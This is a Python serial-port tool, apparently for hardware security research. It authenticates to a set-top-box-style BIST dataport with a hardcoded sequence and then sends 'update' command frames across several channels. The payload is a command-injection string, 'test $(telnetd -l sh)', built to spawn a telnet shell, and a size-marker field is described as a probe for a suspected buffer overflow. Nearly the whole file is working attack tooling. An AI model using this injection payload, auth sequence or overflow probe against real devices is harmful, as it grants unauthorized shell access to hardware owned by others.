"""UART probe for the BIST dataport."""

import argparse
import itertools
import sys
import time
from datetime import datetime
from pathlib import Path
from typing import Protocol, TextIO

import serial

from bistprobe.protocol import build_frame

AUTH_PROMPT = "F0"
AUTH_SEQUENCE = b"DTV--BIST"
AUTH_OK = "BIST Dataport Started"

READ_TIMEOUT = 0.5  # seconds a serial read waits for data
INTER_BYTE_DELAY = 0.05  # seconds between auth sequence bytes
RESPONSE_DELAY = 1.0  # seconds to wait before reading a response
NEXT_FRAME_DELAY = 0.5  # seconds between test frames
RESPONSE_SIZE = 256

CHANNELS = range(7)  # unknown which channel is required
CMD_IDS = (0x2831,)  # update command
PAYLOADS = (b"test $(telnetd -l sh)",)
# The character the target treats as the payload size. It is intentionally not
# required to be hex: non-hex markers (e.g. "Q") are a probe for the suspected
# overflow. Add markers here to widen the probe set.
SIZE_MARKERS = ("1",)


class Port(Protocol):
    """The subset of ``serial.Serial`` used here."""

    def read(self, size: int = 1, /) -> bytes: ...
    def write(self, data: bytes, /) -> int | None: ...
    def flush(self) -> None: ...


def wait_for_line(port: Port, expected: str, timeout: float = 0.0) -> None:
    """Echo received lines until one equals ``expected``.

    ``timeout`` of 0 waits forever. Raises ``TimeoutError`` when the deadline
    passes.
    """
    deadline = time.monotonic() + timeout if timeout else None
    buf = b""
    while True:
        if deadline is not None and time.monotonic() > deadline:
            msg = f"timed out after {timeout:.0f}s waiting for {expected!r}"
            raise TimeoutError(msg)
        buf += port.read(1)
        if b"\n" not in buf:
            continue
        line, _, buf = buf.partition(b"\n")
        decoded = line.decode(errors="ignore").strip()
        print(f"[RX] {decoded}")
        if decoded == expected:
            return


def send_slowly(port: Port, data: bytes) -> None:
    """Write ``data`` one byte at a time with INTER_BYTE_DELAY between bytes."""
    for byte in data:
        port.write(bytes([byte]))
        port.flush()
        time.sleep(INTER_BYTE_DELAY)


def authenticate(port: Port, timeout: float = 0.0) -> None:
    print(f"Waiting for {AUTH_PROMPT!r}...")
    wait_for_line(port, AUTH_PROMPT, timeout)
    print("Got password request, sending sequence...")
    send_slowly(port, AUTH_SEQUENCE)
    print("Waiting for dataport to start...")
    wait_for_line(port, AUTH_OK, timeout)
    print("Authenticated")


def log_result(log: TextIO, frame: bytes, response: bytes) -> None:
    timestamp = datetime.now().astimezone().isoformat(sep=" ", timespec="seconds")
    log.write(f"[{timestamp}] SENT: {frame!r}\n")
    log.write(f"[{timestamp}] RECV: {response!r}\n\n")
    log.flush()


def probe(port: Port, log_file: Path) -> None:
    with log_file.open("a", encoding="utf-8") as log:
        for channel, cmd_id, payload, size_marker in itertools.product(
            CHANNELS, CMD_IDS, PAYLOADS, SIZE_MARKERS
        ):
            frame = build_frame(channel, cmd_id, payload, size_marker=size_marker)
            print(f"\n[>] Sending frame: {frame!r}")
            port.write(frame)
            time.sleep(RESPONSE_DELAY)

            response = port.read(RESPONSE_SIZE)
            print(f"[<] Response: {response!r}")
            log_result(log, frame, response)
            time.sleep(NEXT_FRAME_DELAY)


def parse_args(argv: list[str] | None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(prog="bistprobe", description=__doc__)
    parser.add_argument(
        "-n",
        "--skip-auth",
        action="store_true",
        help="skip the authentication sequence (use if already authenticated)",
    )
    parser.add_argument("-p", "--port", default="/dev/ttyUSB0", help="serial device")
    parser.add_argument("-b", "--baud", type=int, default=115200, help="baud rate")
    parser.add_argument(
        "--auth-timeout",
        type=float,
        default=0.0,
        help="seconds to wait for each authentication step (0 = wait forever)",
    )
    parser.add_argument(
        "-l",
        "--log",
        type=Path,
        default=Path("probe_results.log"),
        help="file to append results to",
    )
    return parser.parse_args(argv)


def main(argv: list[str] | None = None) -> int:
    args = parse_args(argv)
    try:
        with serial.Serial(port=args.port, baudrate=args.baud, timeout=READ_TIMEOUT) as port:
            if not args.skip_auth:
                authenticate(port, args.auth_timeout)
            probe(port, args.log)
    except serial.SerialException as e:
        print(f"bistprobe: serial error: {e}", file=sys.stderr)
        return 1
    except TimeoutError as e:
        print(f"bistprobe: {e}", file=sys.stderr)
        return 1
    except KeyboardInterrupt:
        print("\nbistprobe: interrupted", file=sys.stderr)
        return 130
    return 0
